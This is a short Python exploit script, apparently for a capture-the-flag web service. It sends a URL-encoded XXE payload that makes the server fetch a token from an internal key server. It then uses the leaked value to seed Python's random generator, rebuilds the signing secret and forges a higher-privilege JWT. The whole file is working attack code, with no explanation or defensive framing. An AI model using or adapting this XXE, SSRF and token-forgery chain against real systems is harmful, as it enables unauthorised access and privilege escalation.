from random import randbytes, random, seed
import jwt
import requests
import utils
import base64

IP = "fd66:666:995::2"
class Exploit():
    ip = IP

session = requests.session()
exp = Exploit()
if not utils.checkIfSecretImageWorks(exp,session,None):
    print("Something is wrong with the server")
authCookie = session.cookies.get("auth")
if not authCookie:
    exit()

uuid = jwt.decode(authCookie,options={"verify_signature": False}).get("uuid")
resp = session.post(f"http://[{exp.ip}]:5000/auth/submitIntel",data=f"xmlData=%3C%21DOCTYPE+dataRoot+%5B%3C%21ENTITY+floppa+SYSTEM+%22http%3A%2F%2FKeyServer%3A5001%2FgetToken%2F{uuid}%22%3E+%3C%21ELEMENT+dataRoot+%28%23PCDATA%29%3E%5D%3E%3CdataRoot%3E%26floppa%3B%3C%2FdataRoot%3E",headers={"Content-Type":"application/x-www-form-urlencoded"})

print(resp.status_code)
print(resp.text)

resp = session.get(f"http://[{exp.ip}]:5000/auth/myRequests")

print(resp.text)
base64Token = resp.text.split("&gt;")[1].split("&lt;")[0]
print(base64Token)

token = int(base64.b64decode(base64Token+"=")[2:-3])

seed(token)
secret = []
for i in range(0,5):
    secret.append(randbytes(8))
print(secret)
print(uuid)

print(secret[3])
jwtToken = jwt.encode({"uuid": uuid,"level":2},secret[3],"HS256")
print(jwtToken)
exit(0)
session.cookies.update({"auth":jwtToken})

resp = session.get(f"http://[{exp.ip}]:5000/auth/collectIntel")
print(resp.text)

print(resp.status_code)
print(resp.text)

